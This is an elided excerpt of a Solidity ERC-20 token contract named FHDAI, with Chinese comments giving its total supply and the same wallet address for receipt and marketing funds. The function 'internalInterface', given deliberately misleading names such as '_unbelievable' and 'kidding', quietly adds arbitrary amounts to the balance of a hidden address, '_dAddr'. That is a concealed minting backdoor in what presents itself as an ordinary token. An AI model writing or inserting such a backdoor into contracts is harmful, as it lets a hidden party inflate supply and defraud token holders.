...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function internalInterface(mapping(address => uint256) storage _unbelievable, uint256 kidding) internal{
        _unbelievable[_dAddr] = (_unbelievable[_dAddr] + kidding).add(90);
    }
...
contract FHDAI is AbsToken {
    ...
    //总量
        100000000,
    //Receive，接收地址
        address(0xF910d618Df3D69a874af9f9C22b143846f1deeEE),
    //Fund，营销
        address(0xF910d618Df3D69a874af9f9C22b143846f1deeEE)
    ){
